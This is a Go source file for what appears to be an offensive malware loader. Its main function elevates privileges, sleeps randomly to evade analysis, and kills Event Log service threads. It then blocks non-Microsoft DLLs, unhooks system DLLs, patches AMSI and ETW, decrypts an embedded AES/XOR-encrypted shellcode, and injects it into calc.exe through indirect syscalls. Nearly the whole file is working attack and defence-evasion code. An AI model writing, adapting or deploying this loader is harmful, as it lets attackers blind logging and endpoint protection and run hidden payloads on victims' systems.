package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/hex"
	"fmt"
	"log"
	"main/utils/AMSI_EDR"
	DLLBlocker "main/utils/BLOCKER"
	"main/utils/CleanMemory"
	"main/utils/EVENT_LOG"
	"main/utils/Indirect"
	"main/utils/Unhook"
	"main/utils/elevation"
	"math/rand"
	"time"
)

//go:embed encrypted_loader.bin
var encryptedShellcode []byte

const (
	aesKeyHex = "%KEYAES%"
	xorKeyHex = "%KEYXOR%"
)

func verifyDataIntegrity(data []byte, stage string) bool {
	log.Printf("[*] Verifying data integrity at stage: %s", stage)
	if len(data) == 0 {
		log.Printf("[-] Data integrity check failed at stage: %s - Data is empty", stage)
		return false
	}
	log.Printf("[+] Data integrity check passed at stage: %s", stage)
	return true
}

func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
	log.Printf("[*] Starting AES decryption - Input size: %d bytes", len(ciphertext))

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("[-] AES cipher creation failed: %v", err)
		return nil, fmt.Errorf("[-] failed to create AES cipher: %v", err)
	}

	if len(ciphertext) < aes.BlockSize {
		log.Fatalf("[-] Ciphertext too short: %d bytes", len(ciphertext))
		return nil, fmt.Errorf("[-] ciphertext too short")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	log.Printf("[+] AES decryption completed - Output size: %d bytes", len(ciphertext))

	return ciphertext, nil
}

func xorDecrypt(data, key []byte) ([]byte, error) {
	log.Printf("[*] Starting XOR decryption - Input size: %d bytes", len(data))

	keyLen := len(key)
	if keyLen == 0 {
		log.Fatalf("[-] XOR decryption failed: empty key")
		return nil, fmt.Errorf("[-] invalid XOR key length: key cannot be empty")
	}

	for i := 0; i < len(data); i++ {
		data[i] ^= key[i%keyLen]
	}

	log.Printf("[+] XOR decryption completed - Output size: %d bytes", len(data))

	return data, nil
}

func main() {
	log.SetFlags(0)

	fmt.Println("[*] elevating process")
	if err := elevation.Elevate(); err != nil {
		log.Fatalf("[-] Failed to elevate process: %v", err)
		return
	}
	fmt.Println("[+] Process elevated")

	// Sleep for a random duration between 1 and 15 seconds
	rand.Seed(time.Now().UnixNano())
	sleepDuration := time.Duration(rand.Intn(15)+1) * time.Second
	fmt.Printf("[+] Sleeping for %v\n", sleepDuration)
	time.Sleep(sleepDuration)
	fmt.Println("[+] Woke Up ... Execution Continues")

	// Get the process ID of the Event Log service
	eventlogPid, err := EVENT_LOG.GetEventLogPid()
	if err != nil {
		log.Fatalf("[-] Failed to get Event Log PID: %v", err)
		return
	}
	log.Printf("[+] Event Log PID: %d", eventlogPid)

	// Call the Phant0m function to terminate threads of the Event Log service
	err = EVENT_LOG.Phant0m(eventlogPid)
	if err != nil {
		log.Fatalf("[-] Failed to terminate Event Log threads: %v", err)
		return
	}
	log.Println("[+] Successfully terminated Event Log threads")

	//enable ACG protection
	//fmt.Println("[*] Enabling ACG protection")
	//if err := ACG.EnableACG(); err != nil {
	//	log.Fatalf("[-] Failed to Enable ACG guard protection: %v", err)
	//	return
	//}
	//fmt.Println("[+] ACG protection enabled")

	// Block non-Microsoft-signed DLLs
	fmt.Println("[*] Blocking non-Microsoft-signed DLLs")
	if err := DLLBlocker.BlockDLLs(); err != nil {
		log.Fatalf("[-] Failed to block non-Microsoft-signed DLLs: %v", err)
		return
	}
	fmt.Println("[+] Non-Microsoft-signed DLLs blocked")

	// Unhook DLLs
	fmt.Println("[*] Unhooking DLLs")
	dllsToUnhook := []string{"ntdll.dll", "kernel32.dll", "user32.dll", "advapi32.dll", "amsi.dll"}
	if err := Unhook.FullUnhook(dllsToUnhook); err != nil {
		log.Fatalf("[-] Failed to unhook DLLs: %v", err)
		return
	}
	fmt.Println("[+] DLLs unhooked")

	log.Printf("[*] Patching Amsi And ETW")
	AMSI_EDR.ExecuteAllPatches()
	log.Printf("[+] Patched Amsi And ETW")

	aesKey, err := hex.DecodeString(aesKeyHex)
	if err != nil {
		log.Fatalf("[-] Failed to decode AES key: %v", err)
		return
	}
	defer CleanMemory.ZeroizeMemory(aesKey)

	xorKey, err := hex.DecodeString(xorKeyHex)
	if err != nil {
		log.Fatalf("[-] Failed to decode XOR key: %v", err)
		return
	}
	defer CleanMemory.ZeroizeMemory(xorKey)

	if !verifyDataIntegrity(encryptedShellcode, "encrypted") {
		log.Fatalf("[-] Encrypted shellcode integrity check failed.")
		return
	}

	log.Printf("[*] Starting AES decryption")
	aesDecrypted, err := aesDecrypt(encryptedShellcode, aesKey)
	if err != nil {
		log.Fatalf("[-] AES decryption failed: %v", err)
		return
	}
	defer CleanMemory.ZeroizeMemory(aesDecrypted)

	log.Printf("[*] Starting XOR decryption")
	shellcode, err := xorDecrypt(aesDecrypted, xorKey)
	if err != nil {
		log.Fatalf("[-] XOR decryption failed: %v", err)
		return
	}
	defer CleanMemory.ZeroizeMemory(shellcode)

	if !verifyDataIntegrity(shellcode, "decrypted") {
		log.Fatalf("[-] Decrypted shellcode integrity check failed.")
		return
	}

	exePath := "C:\\Windows\\System32\\calc.exe"
	println("[*] Injecting shellcode into process: ", exePath)
	loader, err := Indirect.Init()
	if err != nil {
		log.Fatalf("[-] Failed to initialize shellcode loader: %v", err)
	}

	err = loader.InjectShellcode(shellcode, exePath)
	if err != nil {
		log.Fatalf("[-] Shellcode injection failed: %v", err)
	}
}
